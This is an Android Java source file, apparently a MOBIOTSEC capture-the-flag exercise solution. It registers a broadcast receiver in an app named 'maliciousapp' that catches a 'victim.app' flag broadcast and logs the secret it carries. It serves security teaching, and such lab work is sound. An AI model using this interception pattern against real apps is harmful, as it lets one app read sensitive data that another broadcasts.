package com.example.maliciousapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class MyBroadcastReceiver extends BroadcastReceiver {
    private static final String TAG = "MOBIOTSEC";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if(action.equals("victim.app.FLAG_ANNOUNCEMENT")) {
            Bundle bundle = intent.getExtras();
            String flag = bundle.getString("flag");
            Log.i(TAG, flag);
        }
    }
}
